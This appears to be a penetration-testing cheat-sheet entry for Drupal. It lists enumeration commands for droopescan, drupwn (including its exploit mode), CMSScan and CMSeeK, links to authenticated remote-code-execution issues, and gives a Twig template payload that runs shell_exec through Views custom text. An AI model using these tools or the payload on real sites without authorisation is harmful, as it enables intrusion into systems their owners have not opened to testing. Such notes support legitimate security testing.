# Drupal

```text
**Tools** 
# droopescan
# https://github.com/droope/droopescan
droopescan scan drupal -u https://example.com -t 32

# drupwn
# https://github.com/immunIT/drupwn
sudo python3 drupwn --mode enum|exploit --target https://example.com

# https://github.com/ajinabraham/CMSScan
docker build -t cmsscan .
docker run -it -p 7070:7070 cmsscan
python3 cmsmap.py -f D https://www.example.com -F

# https://github.com/Tuhinshubhra/CMSeeK
python3 cmseek.py -u domain.com

# Drupal < 8.7.x Authenticated RCE module upload
https://www.drupal.org/project/drupal/issues/3093274
https://www.drupal.org/files/issues/2019-11-08/drupal_rce.tar_.gz

# Drupal < 9.1.x Authenticated RCE Twig templates
https://www.drupal.org/project/drupal/issues/2860607
"Administer views" -> new View of User Fields - >Add a "Custom text"
"{{ {"#lazy_builder": ["shell_exec", ["touch /tmp/hellofromviews"]]} }}"

# If found /node/$NUMBER, the number could be devs or tests pages

# drupal 8
# https://www.exploit-db.com/exploits/46459

```

